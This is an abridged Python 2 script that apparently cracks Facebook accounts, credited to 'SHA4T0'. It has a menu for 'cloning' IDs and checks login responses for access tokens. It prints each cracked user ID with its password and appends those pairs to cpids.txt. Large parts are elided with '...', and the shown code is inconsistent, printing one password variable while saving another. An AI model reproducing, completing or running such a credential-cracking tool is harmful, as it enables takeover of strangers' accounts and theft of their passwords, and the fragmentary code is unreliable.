#Script Given By SAIFUL VAI
#Script Is SHA4T0 VAU
#Script Edited By SHA4T0
#Utf-8 python 
...
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: SHA4T0
\033[1;92mJoin Group \033[1;93m: https://www.facebook.com/groups/2892452771020528/permalink/3018275261771611/?app=fbl
\033[1;92mDisclaimer \033[1;93m: Plz Join This Group
\033[0m----------------------------------
...
def crack():
    ...
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks Saiful Vai
    print ''
    crack_select()
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks Saiful vai
    print 45 * '_'
    print ''
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[NAME-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks Saiful vai
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks Saiful vai
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
